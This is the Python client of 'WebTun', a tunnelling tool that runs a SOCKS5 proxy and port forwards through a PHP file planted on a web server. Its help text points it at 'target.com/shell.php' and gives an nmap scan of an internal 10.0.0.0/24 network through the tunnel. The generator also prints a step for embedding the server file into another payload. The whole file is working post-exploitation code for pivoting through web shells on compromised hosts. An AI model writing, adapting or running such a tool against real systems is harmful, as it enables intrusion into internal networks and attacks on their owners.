#!/usr/bin/env python3
"""
WebTun — Multiplexed HTTP Tunnel Client

Usage:
  Generate server:  webtun.py --generate -k <password> [-o webtun_servers/]
  Connect:          webtun.py -u <url> -k <password> [--socks 1080] [-L local:host:port]
"""

import argparse
import asyncio
import hashlib
import json
import logging
import os
import signal
import struct
import sys
import time

# Lazy imports — only needed in connect mode, not --generate
aiohttp = None
Cipher = algorithms = modes = sym_padding = hashes = crypto_hmac = InvalidSignature = None

def _import_deps():
    global aiohttp, Cipher, algorithms, modes, sym_padding, hashes, crypto_hmac, InvalidSignature
    try:
        import aiohttp as _aiohttp
        aiohttp = _aiohttp
    except ImportError:
        print("[!] aiohttp required: pip install aiohttp", file=sys.stderr)
        sys.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _C, algorithms as _A, modes as _M
        from cryptography.hazmat.primitives import padding as _P, hashes as _H, hmac as _HMAC
        from cryptography.exceptions import InvalidSignature as _IS
        Cipher, algorithms, modes = _C, _A, _M
        sym_padding, hashes, crypto_hmac, InvalidSignature = _P, _H, _HMAC, _IS
    except ImportError:
        print("[!] cryptography required: pip install cryptography", file=sys.stderr)
        sys.exit(1)

log = logging.getLogger('webtun')

# ---- Frame constants ----
F_AUTH           = 0x01
F_AUTH_OK        = 0x02
F_AUTH_FAIL      = 0x03
F_CHAN_OPEN      = 0x10
F_CHAN_OPEN_OK   = 0x11
F_CHAN_OPEN_FAIL = 0x12
F_CHAN_DATA      = 0x20
F_CHAN_EOF       = 0x21
F_CHAN_CLOSE     = 0x22
F_PING           = 0x30
F_PONG           = 0x31

FRAME_HDR = struct.Struct('!BII')  # type(1) + cid(4) + length(4) = 9 bytes


# ============================================================
# Crypto — AES-256-CBC + HMAC-SHA256 (matches PHP)
# ============================================================
class TunnelCrypto:
    def __init__(self, password: str):
        self.key = hashlib.sha256(password.encode()).digest()
        self.key_hex = self.key.hex()

    def encrypt(self, plaintext: bytes) -> bytes:
        iv = os.urandom(16)
        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(plaintext) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv))
        enc = cipher.encryptor()
        ct = enc.update(padded) + enc.finalize()
        h = crypto_hmac.HMAC(self.key, hashes.SHA256())
        h.update(iv + ct)
        mac = h.finalize()
        return iv + ct + mac

    def decrypt(self, blob: bytes) -> bytes:
        if len(blob) < 48:
            raise ValueError('blob too short')
        mac = blob[-32:]
        body = blob[:-32]
        h = crypto_hmac.HMAC(self.key, hashes.SHA256())
        h.update(body)
        h.verify(mac)
        iv = body[:16]
        ct = body[16:]
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv))
        dec = cipher.decryptor()
        padded = dec.update(ct) + dec.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()


# ============================================================
# Frame encode / decode
# ============================================================
def encode_frame(ftype: int, cid: int, payload: bytes = b'') -> bytes:
    return FRAME_HDR.pack(ftype, cid, len(payload)) + payload


def decode_frames(data: bytes) -> list:
    frames = []
    off = 0
    dlen = len(data)
    while off + 9 <= dlen:
        ftype, cid, length = FRAME_HDR.unpack_from(data, off)
        if off + 9 + length > dlen:
            break
        payload = data[off + 9:off + 9 + length]
        frames.append((ftype, cid, payload))
        off += 9 + length
    return frames


# ============================================================
# Channel Manager
# ============================================================
class ChannelManager:
    def __init__(self):
        self._channels = {}       # cid -> {'writer': StreamWriter}
        self._pending = {}        # cid -> asyncio.Future
        self._next_cid = 1
        self._lock = asyncio.Lock()

    async def allocate(self) -> int:
        async with self._lock:
            cid = self._next_cid
            self._next_cid += 1
            return cid

    def set_pending(self, cid: int, fut: asyncio.Future):
        self._pending[cid] = fut

    def resolve_open(self, cid: int, success: bool, error: str = ''):
        fut = self._pending.pop(cid, None)
        if fut and not fut.done():
            fut.set_result((success, error))

    def register(self, cid: int, writer):
        self._channels[cid] = {'writer': writer}

    def get_writer(self, cid: int):
        info = self._channels.get(cid)
        return info['writer'] if info else None

    def remove(self, cid: int):
        info = self._channels.pop(cid, None)
        if info and info['writer']:
            try:
                info['writer'].close()
            except Exception:
                pass

    def all_cids(self):
        return list(self._channels.keys())


# ============================================================
# Upstream Sender — batched POSTs
# ============================================================
class UpstreamSender:
    def __init__(self, url: str, sid: str, crypto: TunnelCrypto,
                 pool_size: int = 3, batch_ms: int = 5, verify_ssl: bool = True):
        self.url = url
        self.sid = sid
        self.crypto = crypto
        self.queue: asyncio.Queue = asyncio.Queue()
        self.batch_ms = batch_ms / 1000.0
        self.verify_ssl = verify_ssl
        self._session = None
        self._task = None
        self._running = False

    async def start(self):
        conn = aiohttp.TCPConnector(limit=6)
        self._session = aiohttp.ClientSession(connector=conn)
        self._running = True
        self._task = asyncio.create_task(self._loop())

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        if self._session:
            await self._session.close()

    async def send_frame(self, ftype: int, cid: int, payload: bytes = b''):
        frame = encode_frame(ftype, cid, payload)
        await self.queue.put(frame)

    async def _loop(self):
        while self._running:
            try:
                first = await self.queue.get()
                batch = [first]
                deadline = asyncio.get_event_loop().time() + self.batch_ms
                while asyncio.get_event_loop().time() < deadline:
                    try:
                        batch.append(self.queue.get_nowait())
                    except asyncio.QueueEmpty:
                        await asyncio.sleep(0.001)
                        break
                raw = b''.join(batch)
                encrypted = self.crypto.encrypt(raw)
                headers = {
                    'X-WT': 'send',
                    'X-WT-SID': self.sid,
                    'X-WT-KEY': self.crypto.key_hex,
                    'Content-Type': 'application/octet-stream',
                }
                # H1 fix: retry failed POSTs up to 3 times
                sent = False
                for attempt in range(3):
                    try:
                        async with self._session.post(
                            self.url, data=encrypted, headers=headers,
                            ssl=self.verify_ssl if self.verify_ssl else False,
                        ) as resp:
                            if resp.status == 200:
                                sent = True
                                break
                            body = await resp.text()
                            log.warning(f'Upstream POST {resp.status} (attempt {attempt+1}): {body[:100]}')
                    except Exception as e:
                        log.warning(f'Upstream send error (attempt {attempt+1}): {e}')
                    if attempt < 2:
                        await asyncio.sleep(0.05 * (attempt + 1))
                if not sent:
                    log.error('Upstream POST failed after 3 attempts, frames lost')
            except asyncio.CancelledError:
                break
            except Exception as e:
                log.error(f'Upstream loop error: {e}')
                await asyncio.sleep(0.1)


# ============================================================
# Downstream Reader — streaming chunked response
# ============================================================
class DownstreamReader:
    def __init__(self, url: str, sid: str, key_hex: str, crypto: TunnelCrypto,
                 channel_mgr: ChannelManager, verify_ssl: bool = True):
        self.url = url
        self.sid = sid
        self.key_hex = key_hex
        self.crypto = crypto
        self.channel_mgr = channel_mgr
        self.verify_ssl = verify_ssl
        self._task = None
        self._running = False
        self._connected = asyncio.Event()

    async def start(self):
        self._running = True
        self._task = asyncio.create_task(self._loop())

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass

    async def wait_connected(self, timeout: float = 15.0):
        await asyncio.wait_for(self._connected.wait(), timeout)

    async def _loop(self):
        while self._running:
            try:
                await self._connect_and_read()
            except asyncio.CancelledError:
                break
            except Exception as e:
                log.warning(f'Downstream connection lost: {e}')
            if self._running:
                self._connected.clear()
                # Notify all channels they're dead
                for cid in self.channel_mgr.all_cids():
                    self.channel_mgr.remove(cid)
                log.info('Reconnecting in 2s...')
                await asyncio.sleep(2)

    async def _connect_and_read(self):
        body = json.dumps({'sid': self.sid, 'key': self.key_hex})
        headers = {'X-WT': 'stream', 'Content-Type': 'application/json'}
        timeout = aiohttp.ClientTimeout(total=None, sock_read=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(
                self.url, data=body, headers=headers,
                ssl=self.verify_ssl if self.verify_ssl else False,
            ) as resp:
                if resp.status != 200:
                    raise ConnectionError(f'Stream returned {resp.status}')
                buf = b''
                # C1 fix: parse length-prefixed encrypted blobs from raw stream
                # Format: [4B BE length][encrypted blob][4B BE length][encrypted blob]...
                async for chunk, _ in resp.content.iter_chunks():
                    buf += chunk
                    while len(buf) >= 4:
                        blob_len = struct.unpack('!I', buf[:4])[0]
                        if blob_len == 0 or blob_len > 1048576:
                            # Invalid length — likely stream corruption
                            log.warning(f'Bad downstream blob length: {blob_len}')
                            buf = b''
                            break
                        if len(buf) < 4 + blob_len:
                            break  # wait for more data
                        blob = buf[4:4 + blob_len]
                        buf = buf[4 + blob_len:]
                        try:
                            decrypted = self.crypto.decrypt(blob)
                        except (ValueError, InvalidSignature) as e:
                            log.warning(f'Downstream decrypt error: {e}')
                            continue
                        frames = decode_frames(decrypted)
                        for ftype, cid, payload in frames:
                            await self._dispatch(ftype, cid, payload)
                        if not self._connected.is_set():
                            self._connected.set()

    async def _dispatch(self, ftype: int, cid: int, payload: bytes):
        if ftype == F_AUTH_OK:
            log.info(f'Tunnel authenticated')
        elif ftype == F_AUTH_FAIL:
            log.error(f'Auth failed: {payload.decode(errors="replace")}')
            self._running = False
        elif ftype == F_CHAN_OPEN_OK:
            self.channel_mgr.resolve_open(cid, True)
        elif ftype == F_CHAN_OPEN_FAIL:
            error = payload.decode(errors='replace')
            log.debug(f'Channel {cid} open failed: {error}')
            self.channel_mgr.resolve_open(cid, False, error)
        elif ftype == F_CHAN_DATA:
            writer = self.channel_mgr.get_writer(cid)
            if writer:
                try:
                    writer.write(payload)
                    await writer.drain()
                except Exception:
                    self.channel_mgr.remove(cid)
        elif ftype == F_CHAN_CLOSE:
            self.channel_mgr.remove(cid)
        elif ftype == F_CHAN_EOF:
            writer = self.channel_mgr.get_writer(cid)
            if writer:
                try:
                    writer.write_eof()
                except Exception:
                    pass
        elif ftype == F_PONG:
            if len(payload) >= 4:
                ts = struct.unpack('!I', payload[:4])[0]
                log.debug(f'Pong: server_time={ts}')


# ============================================================
# SOCKS5 Server
# ============================================================
class Socks5Server:
    def __init__(self, port: int, channel_mgr: ChannelManager, upstream: UpstreamSender):
        self.port = port
        self.channel_mgr = channel_mgr
        self.upstream = upstream
        self._server = None

    async def start(self):
        self._server = await asyncio.start_server(
            self._handle, '127.0.0.1', self.port)
        log.info(f'SOCKS5 listening on 127.0.0.1:{self.port}')

    async def stop(self):
        if self._server:
            self._server.close()
            await self._server.wait_closed()

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        cid = None
        try:
            # SOCKS5 greeting
            data = await asyncio.wait_for(reader.readexactly(2), 5)
            if data[0] != 0x05:
                writer.close()
                return
            methods = await reader.readexactly(data[1])
            writer.write(b'\x05\x00')  # no auth
            await writer.drain()

            # SOCKS5 request
            header = await asyncio.wait_for(reader.readexactly(4), 5)
            ver, cmd, _, atyp = header
            if cmd != 0x01:  # only CONNECT
                writer.write(b'\x05\x07\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                return

            if atyp == 0x01:  # IPv4
                raw = await reader.readexactly(4)
                host = '.'.join(str(b) for b in raw)
            elif atyp == 0x03:  # Domain
                dlen = (await reader.readexactly(1))[0]
                host = (await reader.readexactly(dlen)).decode()
            elif atyp == 0x04:  # IPv6
                raw = await reader.readexactly(16)
                parts = [f'{raw[i]:02x}{raw[i+1]:02x}' for i in range(0, 16, 2)]
                host = ':'.join(parts)
            else:
                writer.write(b'\x05\x08\x00\x01' + b'\x00' * 6)
                await writer.drain()
                writer.close()
                return

            port = struct.unpack('!H', await reader.readexactly(2))[0]
            log.debug(f'SOCKS5 CONNECT {host}:{port}')

            # Open tunnel channel
            cid = await self.channel_mgr.allocate()
            open_payload = json.dumps({'proto': 'tcp', 'host': host, 'port': port}).encode()
            fut = asyncio.get_event_loop().create_future()
            self.channel_mgr.set_pending(cid, fut)
            await self.upstream.send_frame(F_CHAN_OPEN, cid, open_payload)

            try:
                success, error = await asyncio.wait_for(fut, 10.0)
            except asyncio.TimeoutError:
                success, error = False, 'timeout'

            if not success:
                log.debug(f'Channel {cid} failed: {error}')
                writer.write(b'\x05\x05\x00\x01' + b'\x00' * 6)  # connection refused
                await writer.drain()
                writer.close()
                cid = None
                return

            # Success
            writer.write(b'\x05\x00\x00\x01' + b'\x00' * 6)
            await writer.drain()

            # Register and relay
            self.channel_mgr.register(cid, writer)
            await self._relay_local_to_tunnel(cid, reader)

        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.debug(f'SOCKS5 error: {e}')
        finally:
            if cid is not None:
                self.channel_mgr.remove(cid)
                await self.upstream.send_frame(F_CHAN_CLOSE, cid)
            try:
                writer.close()
            except Exception:
                pass

    async def _relay_local_to_tunnel(self, cid: int, reader: asyncio.StreamReader):
        try:
            while True:
                data = await reader.read(32768)
                if not data:
                    await self.upstream.send_frame(F_CHAN_EOF, cid)
                    break
                await self.upstream.send_frame(F_CHAN_DATA, cid, data)
        except Exception:
            pass


# ============================================================
# Port Forward Listener
# ============================================================
class PortForwardListener:
    def __init__(self, local_port: int, remote_host: str, remote_port: int,
                 channel_mgr: ChannelManager, upstream: UpstreamSender):
        self.local_port = local_port
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.channel_mgr = channel_mgr
        self.upstream = upstream

    async def start(self):
        server = await asyncio.start_server(
            self._handle, '127.0.0.1', self.local_port)
        log.info(f'Forward 127.0.0.1:{self.local_port} -> {self.remote_host}:{self.remote_port}')

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        cid = await self.channel_mgr.allocate()
        payload = json.dumps({
            'proto': 'tcp',
            'host': self.remote_host,
            'port': self.remote_port,
        }).encode()
        fut = asyncio.get_event_loop().create_future()
        self.channel_mgr.set_pending(cid, fut)
        await self.upstream.send_frame(F_CHAN_OPEN, cid, payload)

        try:
            success, error = await asyncio.wait_for(fut, 10.0)
        except asyncio.TimeoutError:
            success, error = False, 'timeout'

        if not success:
            log.warning(f'Forward channel {cid} failed: {error}')
            writer.close()
            return

        self.channel_mgr.register(cid, writer)
        try:
            while True:
                data = await reader.read(32768)
                if not data:
                    await self.upstream.send_frame(F_CHAN_EOF, cid)
                    break
                await self.upstream.send_frame(F_CHAN_DATA, cid, data)
        except Exception:
            pass
        finally:
            self.channel_mgr.remove(cid)
            await self.upstream.send_frame(F_CHAN_CLOSE, cid)
            try:
                writer.close()
            except Exception:
                pass


# ============================================================
# Server Generator
# ============================================================
def generate_server(password: str, output_dir: str):
    template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
    template_path = os.path.join(template_dir, 'tunnel.php')
    if not os.path.exists(template_path):
        print(f'[!] Template not found: {template_path}')
        sys.exit(1)

    with open(template_path, 'r') as f:
        content = f.read()

    key_hash = hashlib.sha256(password.encode()).hexdigest()
    content = content.replace('{{KEY_HASH}}', key_hash)

    os.makedirs(output_dir, exist_ok=True)
    out_path = os.path.join(output_dir, 'tunnel.php')
    with open(out_path, 'w') as f:
        f.write(content)

    print(f'[+] Server generated: {out_path}')
    print(f'[+] Key hash: {key_hash[:16]}...')
    print(f'[*] Embed with: python generate.py --tunnel {out_path}')


# ============================================================
# Main — connect mode
# ============================================================
async def tunnel_main(args):
    crypto = TunnelCrypto(args.key)
    channel_mgr = ChannelManager()

    # Step 1: Open session
    log.info(f'Opening tunnel session to {args.url}')
    headers = {'X-WT': 'open'}
    ssl_ctx = False if args.no_verify_ssl else None
    async with aiohttp.ClientSession() as session:
        async with session.post(
            args.url, data=crypto.key_hex, headers=headers, ssl=ssl_ctx,
        ) as resp:
            if resp.status != 200:
                body = await resp.text()
                log.error(f'Open failed ({resp.status}): {body[:200]}')
                return
            result = await resp.json()
            if 'error' in result:
                log.error(f'Open failed: {result["error"]}')
                return
            sid = result['sid']
            caps = result.get('server_caps', {})
            log.info(f'Session: {sid}')
            log.info(f'Server caps: {json.dumps(caps)}')

    # Step 2: Start components
    upstream = UpstreamSender(
        args.url, sid, crypto,
        pool_size=args.upstream_pool,
        batch_ms=args.batch_ms,
        verify_ssl=not args.no_verify_ssl,
    )
    await upstream.start()

    downstream = DownstreamReader(
        args.url, sid, crypto.key_hex, crypto,
        channel_mgr,
        verify_ssl=not args.no_verify_ssl,
    )
    await downstream.start()

    try:
        await downstream.wait_connected(timeout=15)
    except asyncio.TimeoutError:
        log.error('Downstream connection timeout')
        await upstream.stop()
        await downstream.stop()
        return

    log.info('Tunnel active')

    # Step 3: SOCKS5 server
    socks = None
    if args.socks:
        socks = Socks5Server(args.socks, channel_mgr, upstream)
        await socks.start()

    # Step 4: Port forwards
    for fwd in (args.L or []):
        parts = fwd.split(':')
        if len(parts) != 3:
            log.warning(f'Invalid forward: {fwd} (expected local_port:host:remote_port)')
            continue
        local_port = int(parts[0])
        remote_host = parts[1]
        remote_port = int(parts[2])
        pf = PortForwardListener(local_port, remote_host, remote_port, channel_mgr, upstream)
        await pf.start()

    # Step 5: Ping loop + wait for shutdown
    stop_event = asyncio.Event()

    def handle_signal():
        log.info('Shutting down...')
        stop_event.set()

    loop = asyncio.get_event_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, handle_signal)
        except NotImplementedError:
            pass  # Windows

    ping_task = asyncio.create_task(_ping_loop(upstream, stop_event))

    await stop_event.wait()

    # Cleanup
    ping_task.cancel()
    if socks:
        await socks.stop()
    await upstream.stop()
    await downstream.stop()
    log.info('Tunnel closed')


async def _ping_loop(upstream: UpstreamSender, stop_event: asyncio.Event):
    while not stop_event.is_set():
        try:
            ts = struct.pack('!I', int(time.time()))
            await upstream.send_frame(F_PING, 0, ts)
        except Exception:
            pass
        try:
            await asyncio.wait_for(stop_event.wait(), 20)
            break
        except asyncio.TimeoutError:
            pass


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description='WebTun — Multiplexed HTTP Tunnel',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Generate server:
    %(prog)s --generate -k mypassword

  Connect with SOCKS5:
    %(prog)s -u https://target.com/shell.php -k mypassword --socks 1080

  Connect with port forward:
    %(prog)s -u https://target.com/shell.php -k mypassword -L 3306:10.0.0.5:3306

  Scan through tunnel:
    nmap -sT -Pn --proxy socks5://127.0.0.1:1080 10.0.0.0/24
""")

    parser.add_argument('--generate', action='store_true',
                        help='Generate server PHP file')
    parser.add_argument('-k', '--key', required=True,
                        help='Tunnel password')
    parser.add_argument('-u', '--url', default='',
                        help='Shell URL')
    parser.add_argument('-o', '--output', default='',
                        help='Output directory for --generate (default: webtun_servers/)')
    parser.add_argument('--socks', type=int, default=1080,
                        help='SOCKS5 listen port (default: 1080, 0 to disable)')
    parser.add_argument('-L', action='append', default=None,
                        help='Port forward: local_port:remote_host:remote_port')
    parser.add_argument('--upstream-pool', type=int, default=3,
                        help='Upstream HTTP connection pool size (default: 3)')
    parser.add_argument('--batch-ms', type=int, default=5,
                        help='Upstream batching window in ms (default: 5)')
    parser.add_argument('--no-verify-ssl', action='store_true',
                        help='Skip TLS certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Debug logging')

    args = parser.parse_args()

    level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(
        level=level,
        format='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%H:%M:%S',
    )

    if args.generate:
        output_dir = args.output or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), 'webtun_servers')
        generate_server(args.key, output_dir)
        return

    # Connect mode requires external deps
    _import_deps()

    if not args.url:
        parser.error('-u/--url is required in connect mode')

    if args.socks == 0:
        args.socks = None

    try:
        asyncio.run(tunnel_main(args))
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()
